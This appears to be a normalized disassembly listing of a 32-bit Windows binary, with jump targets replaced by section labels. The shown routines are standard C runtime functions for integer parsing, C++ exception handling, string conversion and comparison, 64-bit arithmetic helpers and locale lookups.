mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1007a66c
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_1004834e
add esp 0xc
test eax eax
je r-xdata
call sub_10025450
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_10078600
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_1007a6c3
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_10003602
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_1007a6f9
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_1004ba5c
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_1007a6e3
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_1007a723
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_10054678
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_100159e2
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_10012991
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_1007a94e
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_10044fed
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1007a993
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_1001e222
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_10049d3a
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
jmp r-xdata
pop esi
pop ebx
sub_1007aa52
push 0x2c
push r--data
call sub_10078b50
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_10039d0d
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_10044fed
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_10044fed
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_10044fed
mov [ eax + 0x88 ] esi
call sub_10044fed
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_10007c8a
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1007ab78
mov eax [ ebp - 0x1c ]
call sub_10078b95
retn
sub_1007aaeb
mov esp [ ebp - 0x18 ]
call sub_10044fed
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_10012d8f
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1007ab78
mov eax [ ebp - 0x1c ]
call sub_10078b95
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1007ab78
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10030551
pop ecx
call sub_10044fed
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_10044fed
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1003ebe7
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1000450d
pop ecx
pop ecx
sub_1007abee
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1001201e
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_100119a3
call sub_1002f2a3
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_10012d8f
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1007aa52
add esp 0x28
test eax eax
je r-xdata
sub_1007ac5c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_10044fed
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_10044fed
lea edi [ eax + 0x80 ]
call sub_10042f06
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10010421
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_1001e222
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1004e4ec
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007abee
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_1007ad63
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1001e222
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_10044fed
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1001e222
call sub_1002423f
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1007ac5c
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_10044fed
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_10044fed
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_10044fed
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1002a5ac
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10010421
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1001e222
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1000450d
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_10044fed
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_10044fed
mov edi [ eax + 0x94 ]
call sub_10044fed
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1007a993
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1007a993
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10035ce3
test al al
jne r-xdata
call sub_1001e222
cmp eax 0x19930522
jne r-xdata
call sub_10044fed
call sub_10044fed
call sub_10044fed
mov [ eax + 0x88 ] esi
call sub_10044fed
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_10049d3a
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1000450d
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10052185
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_1002050e
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1007abee
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1002f2a3
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10012d8f
add esp 0x10
push [ esi + 0x1c ]
call sub_1007aa09
sub_1007b0e0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_1007c7ec
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_1007c7ec
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1007b12c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10078970
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10036463
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_10056814
pop ecx
cmp eax ebx
je r-xdata
call sub_1007c030
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_1007b220
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_1007b290
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1007b320
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_1007c7f5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_1007c814
jmp r-xdata
sub_1007b320
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_1004c3b6
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1007b290
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1007b382
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1007b3b2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1007b3f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1007b490
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1007b4c4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_1002f2f7
